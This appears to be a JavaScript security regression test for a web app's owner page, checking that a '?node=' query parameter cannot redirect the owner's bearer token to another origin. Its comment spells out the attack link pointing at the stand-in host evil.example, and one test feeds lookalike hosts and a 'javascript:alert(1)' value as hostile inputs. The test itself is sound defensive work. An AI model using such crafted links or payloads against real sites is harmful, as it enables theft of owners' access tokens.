// atk11o: the owner page sends the owner token to whatever node `?node=` names.
// Fails today: a link https://web4.mendes.dev/owner/?node=https://evil.example makes the legit
// owner page POST/GET with `Authorization: Bearer <OWNER_TOKEN>` to evil.example (the token is
// typed into, or already saved in sessionStorage of, the real Tuttie origin).
import test from "node:test";
import assert from "node:assert/strict";

test("owner token never goes to an origin chosen by the page address", async () => {
  globalThis.location = new URL("https://web4.mendes.dev/owner/?node=https://evil.example");
  const calls = [];
  globalThis.fetch = async (url, init) => { calls.push({ url, auth: init.headers.Authorization }); return { ok: true, json: async () => ({}) }; };
  const { fetchOverview } = await import("./api.js");
  await fetchOverview("s3cret-owner-token");
  const leaked = calls.filter(c => new URL(c.url).hostname === "evil.example");
  assert.deepEqual(leaked, [], `token sent to attacker node: ${JSON.stringify(leaked)}`);
});

test("?node= on the page's own host or localhost is still used", async () => {
  const { nodeUrl } = await import("./api.js");
  globalThis.location = new URL("https://web4.mendes.dev/owner/?node=https://web4.mendes.dev:4008/");
  assert.equal(nodeUrl(), "https://web4.mendes.dev:4008");
  globalThis.location = new URL("http://185.214.135.46:4041/?node=http://localhost:4001");
  assert.equal(nodeUrl(), "http://localhost:4001");
  globalThis.location = new URL("http://185.214.135.46:4041/?node=http://127.0.0.1:4002");
  assert.equal(nodeUrl(), "http://127.0.0.1:4002");
});

test("a foreign or malformed ?node= falls back to the default node", async () => {
  const { nodeUrl } = await import("./api.js");
  for (const node of ["https://evil.example", "https://web4.mendes.dev.evil.example", "javascript:alert(1)", "not a url", "//evil.example"]) {
    globalThis.location = new URL(`https://web4.mendes.dev/owner/?node=${encodeURIComponent(node)}`);
    assert.equal(nodeUrl(), "https://web4.mendes.dev:4009", node);
  }
});
